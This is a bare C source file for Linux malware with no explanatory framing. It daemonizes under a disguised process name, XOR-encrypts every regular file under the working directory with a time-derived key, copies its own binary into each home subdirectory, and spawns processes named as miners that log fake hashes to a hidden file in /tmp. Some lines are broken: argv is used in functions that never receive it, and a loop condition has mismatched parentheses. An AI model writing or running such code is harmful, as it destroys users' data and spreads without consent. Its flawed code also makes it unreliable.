#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <fcntl.h>
#include <openssl/rand.h>

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    umask(0);
    setsid();
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    strcpy(argv[0], "/init");
}

void encrypt_file(const char *path, time_t key) {
    FILE *file = fopen(path, "r+");
    if (!file) return;
    
    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    char *buffer = malloc(size);
    fread(buffer, 1, size, file);
    
    for (long i = 0; i < size; i++) {
        buffer[i] ^= (char)(key >> (8 * (i % sizeof(key))));
    }
    
    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);
}

void encrypt_directory(const char *dirpath, time_t key) {
    DIR *dir;
    struct dirent *entry;
    
    if (!(dir = opendir(dirpath))) return;
    
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
            
        char path[1024];
        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
        
        if (entry->d_type == DT_DIR) {
            encrypt_directory(path, key);
        } else if (entry->d_type == DT_REG) {
            encrypt_file(path, key);
        }
    }
    closedir(dir);
}

void spread_malware() {
    DIR *dir;
    struct dirent *entry;
    char home_path[1024];
    char self_path[1024];
    
    snprintf(home_path, sizeof(home_path), "%s", getenv("HOME"));
    readlink("/proc/self/exe", self_path, sizeof(self_path));
    
    if (!(dir = opendir(home_path))) return;
    
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && 
            strcmp(entry->d_name, "..") != 0) {
            
            char target_path[2048];
            snprintf(target_path, sizeof(target_path), "%s/%s/rumme", home_path, entry->d_name);
            
            FILE *src = fopen(self_path, "rb");
            FILE *dst = fopen(target_path, "wb");
            
            if (src && dst) {
                char buffer[1024];
                size_t bytes;
                
                while ((bytes = fread(buffer, 1, sizeof(buffer), src)) {
                    fwrite(buffer, 1, bytes, dst);
                }
                
                fclose(src);
                fclose(dst);
                chmod(target_path, 0755);
            }
        }
    }
    closedir(dir);
}

void miner_process(int id) {
    char hash[65];
    char log_entry[256];
    time_t now;
    struct tm *timeinfo;
    FILE *log_file;
    
    while(1) {
        RAND_bytes((unsigned char *)hash, 64);
        for (int i = 0; i < 64; i++) {
            hash[i] = "0123456789abcdef"[hash[i] % 16];
        }
        hash[64] = '\0';
        
        time(&now);
        timeinfo = localtime(&now);
        
        strftime(log_entry, sizeof(log_entry), "[%Y-%m-%d %H:%M:%S]", timeinfo);
        snprintf(log_entry + strlen(log_entry), sizeof(log_entry) - strlen(log_entry), 
                "[Miner %d] %s", id, hash);
        
        log_file = fopen("/tmp/.miner.log", "a");
        if (log_file) {
            fprintf(log_file, "%s\n", log_entry);
            fclose(log_file);
        }
        
        sleep(3 + (rand() % 28));
    }
}

void launch_miners() {
    pid_t pid;
    int miners_count = 3;
    
    for (int i = 0; i < miners_count; i++) {
        pid = fork();
        
        if (pid == 0) {
            char process_name[32];
            snprintf(process_name, sizeof(process_name), "mine-crafter-%d", i);
            strcpy(argv[0], process_name);
            
            miner_process(i);
            exit(0);
        } else if (pid < 0) {
            break;
        }
    }
}

int main() {
    daemonize();
    time_t encryption_key = time(NULL);
    
    while(1) {
        encrypt_directory(".", encryption_key);
        spread_malware();
        launch_miners();
        sleep(30);
    }
    
    return 0;
}
